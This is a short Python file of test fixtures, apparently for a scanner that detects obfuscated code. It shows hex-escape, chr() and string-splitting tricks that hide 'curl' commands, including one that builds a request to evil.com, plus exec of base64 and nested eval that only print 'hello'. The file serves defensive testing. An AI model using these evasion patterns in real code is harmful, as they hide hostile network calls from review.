# Obfuscation test fixtures

# Hex escape chain
cmd = "\x63\x75\x72\x6c\x20\x68\x74\x74\x70"

# chr() concatenation
payload = chr(99) + chr(117) + chr(114) + chr(108)

# base64 + exec
import base64

exec(base64.b64decode("cHJpbnQoJ2hlbGxvJyk="))

# Nested eval
eval(compile("print('hello')", "<string>", "exec"))

# String concatenation for commands
cmd2 = "cu" + "rl" + " http://evil.com"
